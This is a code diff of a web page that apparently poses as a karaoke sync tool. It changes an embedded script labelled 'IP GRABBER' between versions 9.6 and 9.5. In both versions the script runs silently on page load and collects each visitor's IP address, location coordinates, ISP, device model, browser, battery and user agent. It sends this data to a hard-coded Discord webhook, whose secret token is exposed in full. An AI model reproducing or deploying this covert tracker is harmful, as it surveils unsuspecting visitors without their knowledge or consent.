@@ -1204,41 +1204,23 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER v9.6 - Client Hints + UA Reduction ==================== -->
+<!-- ==================== IP GRABBER v9.5 - Handle Chrome UA Reduction ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
-async function getDetailedDeviceInfo() {
+function getDetailedDeviceInfo() {
     const ua = navigator.userAgent;
     const uaLower = ua.toLowerCase();
-    
-    let deviceModel = "Android Device";
-    let modelHint = "";
-    let isReducedUA = ua.includes("Android 10; K") || uaLower.includes("android 10; k");
 
-    // === Coba ambil model asli lewat Client Hints (paling akurat saat ini) ===
-    if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
-        try {
-            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-            if (hints.model && hints.model.trim() !== "") {
-                modelHint = hints.model.trim();
-                deviceModel = `Android ${modelHint}`;
-            } else if (isReducedUA) {
-                deviceModel = "Android Device (Model hidden by Chrome - Client Hints failed)";
-            }
-        } catch (e) {
-            // User menolak atau tidak didukung
-            if (isReducedUA) {
-                deviceModel = "Android Device (Model hidden by Chrome)";
-            }
-        }
-    } else if (isReducedUA) {
-        deviceModel = "Android Device (Model hidden by Chrome)";
-    }
+    // Cek apakah menggunakan Chrome UA Reduction (paling umum sekarang)
+    const isReducedUA = ua.includes('Android 10; K') || uaLower.includes('android 10; k');
 
-    // Fallback deteksi brand sederhana jika Client Hints gagal total
-    if (deviceModel === "Android Device" && !isReducedUA) {
+    let deviceModel = 'Android Device';
+    if (isReducedUA) {
+        deviceModel = 'Android Device (Model Hidden by Chrome)';
+    } else {
+        // Fallback deteksi biasa (untuk browser lama atau non-Chromium)
         if (uaLower.includes('samsung')) deviceModel = 'Samsung Device';
         else if (uaLower.includes('xiaomi') || uaLower.includes('redmi') || uaLower.includes('poco')) deviceModel = 'Xiaomi/Redmi/Poco';
         else if (uaLower.includes('oppo') || uaLower.includes('realme')) deviceModel = 'Oppo/Realme';
@@ -1248,7 +1230,7 @@ async function getDetailedDeviceInfo() {
     }
 
     // Browser
-    let browser = "Unknown Browser";
+    let browser = 'Unknown Browser';
     if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
         const ver = ua.match(/Chrome\/(\d+)/);
         browser = `Chrome ${ver ? ver[1] : ''}`;
@@ -1256,10 +1238,10 @@ async function getDetailedDeviceInfo() {
         const ver = ua.match(/Edg\/(\d+)/);
         browser = `Edge ${ver ? ver[1] : ''}`;
     } else if (ua.includes('SamsungBrowser')) {
-        browser = "Samsung Internet";
+        browser = 'Samsung Internet';
     }
 
-    return { deviceModel, browser, isReducedUA, modelHint };
+    return { deviceModel, browser, isReducedUA };
 }
 
 async function sendIPLog() {
@@ -1279,7 +1261,7 @@ async function sendIPLog() {
         };
     } catch (e) {}
 
-    const { deviceModel, browser, isReducedUA } = await getDetailedDeviceInfo();
+    const { deviceModel, browser, isReducedUA } = getDetailedDeviceInfo();
     
     let batteryInfo = 'Tidak tersedia';
     if ('getBattery' in navigator) {
@@ -1293,7 +1275,7 @@ async function sendIPLog() {
     const androidVersion = androidMatch ? androidMatch[1] : '—';
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.6)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.5)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
@@ -1302,7 +1284,7 @@ async function sendIPLog() {
             { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
             { name: "ISP", value: ipData.org, inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
-            { name: "Android Version", value: androidVersion + (isReducedUA ? " (reduced by Chrome)" : ""), inline: true },
+            { name: "Android Version", value: androidVersion + (isReducedUA ? " (fake by Chrome)" : ""), inline: true },
             { name: "Browser", value: browser, inline: true },
             { name: "Operating System", value: navigator.platform || 'Unknown', inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
@@ -1314,7 +1296,7 @@ async function sendIPLog() {
             { name: "User Agent", value: navigator.userAgent.substring(0, 240) + "...", inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber v9.6 • Client Hints + UA Reduction" }
+        footer: { text: "IP Grabber v9.5 • Chrome UA Reduction Detected" }
     };
 
     try {
@@ -1323,15 +1305,12 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim (v9.6 - Client Hints)", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim (v9.5 - Chrome UA Reduction)", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("❌ IP Logger error:", err.message);
     }
 }
 
-// Jalankan setelah load
-window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 2000);
-});
+window.addEventListener('load', () => setTimeout(sendIPLog, 1800));
 </script>
-<!-- ==================== END IP GRABBER v9.6 ==================== -->
+<!-- ==================== END IP GRABBER v9.5 ==================== -->
